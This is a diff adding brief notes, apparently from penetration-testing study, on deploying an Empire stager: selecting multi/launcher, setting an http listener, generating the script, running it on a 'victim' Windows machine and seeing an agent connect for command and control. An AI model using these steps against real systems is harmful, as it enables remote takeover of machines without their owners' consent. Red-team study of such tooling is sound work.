@@ -1,0 +1,20 @@
+Empire - Deploy Empire Stager
+
++ Stager is payload that will be run on intended victims to establish command and control with Empire server
+
+
+Configuring Empire Stager
+
++ Select new stager, multi/launcher
+	# (Empire) > usestager multi/launcher
+	
++ Specify listener, example using http listener
+	# (Empire: stager/multi/launcher) > set Listener http
+	
++ Generate stager script
+	# (Empire: stager/multi/launcher) > generate
+	
++ Copy the script to clipboard and paste or run it on terminal on your target Windows machine
+
++ Once the script is executed, Empire will notify that agent has been connected
+	# (Empire: agents) > [+] Initial agent C96YSLZN from 192.168.202.148 now active (Slack)
